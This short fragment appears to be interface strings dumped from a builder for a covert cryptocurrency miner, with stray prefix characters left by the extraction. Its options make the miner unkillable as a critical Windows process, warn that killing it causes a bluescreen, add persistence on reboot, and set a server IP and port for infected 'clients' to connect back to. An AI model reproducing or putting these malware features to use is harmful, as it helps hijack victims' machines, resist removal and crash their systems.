Enable Critical Process. If enabled the miner will be unkillable in Task Manager / Process Hacker. (RECOMMENDED) (WARNING: IF YOU KILL THE MINER YOU WILL GET A BLUESCREEN!)
wWhat is mutex? (Mutex creates only 1 instance of the miner. If you spam the miner file it will not open multiple times)
GRun the miner on reboot of the machine. (Persistence/Installer/Startup)
GEnter your DNS / IP for the clients to connect to (google: whats my ip)
9Enter your port for your clients to connect to (ex: 8808)
